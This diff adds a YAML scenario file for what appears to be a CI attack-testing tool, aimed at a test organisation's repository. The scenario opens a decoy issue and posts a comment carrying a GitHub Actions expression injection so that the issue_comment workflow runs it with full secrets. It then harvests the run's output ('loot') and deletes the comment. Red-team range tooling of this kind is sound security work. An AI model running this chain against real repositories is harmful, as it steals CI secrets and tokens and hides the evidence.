@@ -1,0 +1,47 @@
+apiVersion: trajan.attack/v1
+title: Issue-comment injection into a default-branch workflow
+rule: cat-01/issue-comment-checkout
+
+# issue_comment reads the workflow body from the default branch, always, with
+# full secrets and a full token. An issue needs no fork, branch or commit; its
+# comments fire issue_comment, and run.observe waits for the run the comment
+# provoked.
+#
+# No encryption: the seal brackets the steps of a job trajan composes, and the
+# job here is the target's own — the comment body is data it interpolates. The
+# marker stream lands in the customer's run log in the clear, which the fragment
+# keeps free of secret values for that reason.
+
+scope: [ghektestorg/fr-01-04-issue-comment-checkout]
+identity: store:range-attacker
+
+steps:
+  - id: target
+    uses: repo.resolve
+    owner: ghektestorg
+    repo: fr-01-04-issue-comment-checkout
+
+  - id: issue
+    uses: issue.open
+    repo: target
+    title: "docs: clarify build step"
+    body: "Tracking a docs tweak."
+
+  - id: comment
+    uses: comment.create
+    on: issue
+    template: t-08/expression-injection
+    params: { marker: comment-inject }
+
+  - id: run
+    uses: run.observe
+    on: target
+    workflow: .github/workflows/triage.yml
+    match: comment-inject
+
+  - id: loot
+    uses: run.harvest
+    on: run
+
+cleanup:
+  - { uses: comment.delete, id: cleanup-comment, comment: comment }
